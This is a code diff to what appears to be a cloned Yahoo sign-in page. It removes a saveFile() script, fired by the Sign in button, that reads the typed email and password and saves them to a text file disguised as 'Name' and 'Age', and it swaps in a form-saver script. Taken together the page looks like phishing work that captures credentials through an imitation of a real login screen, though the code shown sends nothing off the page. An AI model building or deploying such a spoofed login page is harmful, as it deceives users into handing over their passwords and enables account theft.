@@ -143,10 +143,17 @@ root.challenge.servingStamp = 1532406921040;
 <h3 class="bf bg bh"></h3>
 <input autocorrect="off" autocapitalize="off" class="bi bj bl bm" placeholder="password" id="pass" type="password" />
 <p class="signin-cont">
-            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign in" onclick="saveFile()"  data-ylk="elm:btn;elmt:next;slk:next">                        
-                    Sign in
-            </button>
-        </p>
+<div>
+  <div data-form-status></div>
+  <div>
+				<!-- <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign in" data-form-save="#form-id"  data-ylk="elm:btn;elmt:next;slk:next">                         -->
+						<!-- Sign in -->
+				<!-- </button> -->
+				 <button data-form-save="#form-id">
+				 Sign in
+			</div>
+</div>     
+	 </p>
  <p class="forgot-cont">
             <input type="submit" class="pure-button puree-button-link"
                 data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link"
@@ -171,7 +178,6 @@ root.challenge.servingStamp = 1532406921040;
 </div>
 
 </div>
-
 </div>
 
     <script src="https://s.yimg.com/wm/mbr/0.1.6235/bundle.js"></script>
@@ -181,30 +187,34 @@ root.challenge.servingStamp = 1532406921040;
    
     <div id="mbr-css-check"></div>
 
-
+<script src="dist/js/form-saver.js"></script>
+		<script>
+			formSaver.init();
+		</script>
 </body>
-<script>
- let saveFile = () => {
-								const name = document.getElementById('email');
-        const age = document.getElementById('pass');	
-		
-		        let data = '\r Name: ' + email.value + ' \r\n ' + 
-            'Age: ' +pass.value;
-			  const textToBLOB = new Blob([data], { type: 'text/plain' });
-        const sFileName = 'formData.txt';
-		   let newLink = document.createElement("a");
-        newLink.download = sFileName;
-		        if (window.webkitURL != null) {
-            newLink.href = window.webkitURL.createObjectURL(textToBLOB);
-        }
-        else {
-            newLink.href = window.URL.createObjectURL(textToBLOB);
-            newLink.style.display = "none";
-            document.body.appendChild(newLink);
-        }
 
-        newLink.click(); 
-    }
+<!-- <script> -->
+ <!-- let saveFile = () => { -->
+								<!-- const name = document.getElementById('email'); -->
+        <!-- const age = document.getElementById('pass');	 -->
+		
+		        <!-- let data = '\r Name: ' + email.value + ' \r\n ' +  -->
+            <!-- 'Age: ' +pass.value; -->
+			  <!-- const textToBLOB = new Blob([data], { type: 'text/plain' }); -->
+        <!-- const sFileName = 'formData.txt'; -->
+		   <!-- let newLink = document.createElement("a"); -->
+        <!-- newLink.download = sFileName; -->
+		        <!-- if (window.webkitURL != null) { -->
+            <!-- newLink.href = window.webkitURL.createObjectURL(textToBLOB); -->
+        <!-- } -->
+        <!-- else { -->
+            <!-- newLink.href = window.URL.createObjectURL(textToBLOB); -->
+            <!-- newLink.style.display = "none"; -->
+            <!-- document.body.appendChild(newLink); -->
+        <!-- } -->
+
+        <!-- newLink.click();  -->
+    <!-- } -->
  
-</script>
+<!-- </script> -->
 </html>
